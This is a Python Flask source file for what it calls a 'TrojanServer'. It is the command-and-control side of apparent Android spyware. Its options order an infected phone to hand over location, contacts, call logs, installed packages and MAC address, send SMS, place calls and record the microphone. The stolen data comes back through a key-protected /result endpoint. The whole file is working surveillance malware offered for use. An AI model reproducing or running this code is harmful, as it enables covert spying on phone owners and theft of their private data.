from flask import Flask, request, Response
import argparse
import os
import json
import hashlib
import logging


KEY = 'LOL' + '8df639b301a1e10c36cc2f03bbdf8863'


class ParseArgs:
    def __init__(self):
        self.parser = argparse.ArgumentParser(description='ACTION')
        self.parser.add_argument('--location', dest='location', action='store_true', default=False,
                                 help='get Location')
        self.parser.add_argument('--contacts', dest='contacts', action='store_true', default=False,
                                 help='get Contacts')
        self.parser.add_argument('--calllogs', dest='calllogs', action='store_true', default=False,
                                 help='Get calllogs')
        self.parser.add_argument('--packages', dest='packages', action='store_true', default=False,
                                 help='get installed packages')
        self.parser.add_argument('--mac', dest='mac', action='store_true', default=False,
                                 help='get Mac address')
        self.parser.add_argument('--sendsms', dest='sendsms', action='store', metavar=('PhoneNumber', 'Message'),
                                 nargs=2, default=False,
                                 help='Send SMS')
        self.parser.add_argument('--call', dest='call', action='store', metavar=('PhoneNumber', 'calltime'), nargs=2,
                                 default=False,
                                 help='call a number for X millisecondes')
        self.parser.add_argument('--recordmic', dest='recordmic', action='store', metavar=('recordtime'), nargs=1,
                                 default=False,
                                 help='record mic sound for X millisecondes and send receive the audio file')
        self.parser.add_argument('-v', '--verbose', dest='verbose', action='store_true', default=False,
                                 help='verbose')
        self.args = self.parser.parse_args()

    def getargs(self):
        return self.args


class TrojanServer():
    def __init__(self, app, host, port, args, ssl=False):
        self.app = app
        self.host = host
        self.port = port
        self.args = args
        self.ssl = ssl
        self.null = 'null'
        self.excludeArgs = ['verbose']
        self.nullAction = False
        self.route()

    def route(self):
        self.app.add_url_rule('/', view_func=self.default, methods=['GET', ])
        self.app.add_url_rule('/action', view_func=self.action, methods=['GET', ])
        self.app.add_url_rule('/result', view_func=self.result, methods=['POST', ])

    def start(self):
        if not self.args.verbose:
            logging.getLogger('werkzeug').setLevel(logging.ERROR)

        if not self.ssl:
            self.app.run(host=self.host, port=self.port, debug=self.args.verbose)
        else:
            self.app.run(host=self.host, port=self.port, ssl_context=self.ssl, debug=self.args.verbose)

    @staticmethod
    def default(self):
        return 'hello'

    def action(self):
        for arg, value in sorted(vars(self.args).items()):
            if value and not self.nullAction and arg not in self.excludeArgs:
                return Response(json.dumps({arg: value}), status=200, mimetype='application/json')
        return self.null

    def result(self):
        sha1 = hashlib.sha1()
        sha1.update(KEY)

        if request.headers.get('Authorization') == sha1.hexdigest():
            try:
                resultjson = json.dumps(request.get_json(), indent=3, sort_keys=True, encoding="utf-8")
                print(request.remote_addr)
                print(resultjson)
            except:
                print(request.remote_addr)
                print(str(request.data))

            self.nullAction = True
            self.stop()
            return Response(self.null, status=200)
        else:
            print(request.remote_addr + "Wrong KEY")
            return Response(self.null, status=401)

    @staticmethod
    def stop(self):
        func = request.environ.get('werkzeug.server.shutdown')
        if func is None:
            raise RuntimeError('Not running with the Werkzeug Server')
        func()


def main():
    if os.path.isfile('ssl/app.crt'):
        if os.path.isfile('ssl/app.key'):
            ssl = ('ssl/app.crt', 'ssl/app.key')
        else:
            ssl = False
    else:
        ssl = False
    app = Flask(__name__)
    server = TrojanServer(app=app, host='192.168.1.2', port=8080, args=ParseArgs().getargs(), ssl=ssl)
    # server = trojan_server(app=app, host='192.168.1.79', port=8080, args=parse_args().getargs())
    server.start()


if __name__ == '__main__':
    main()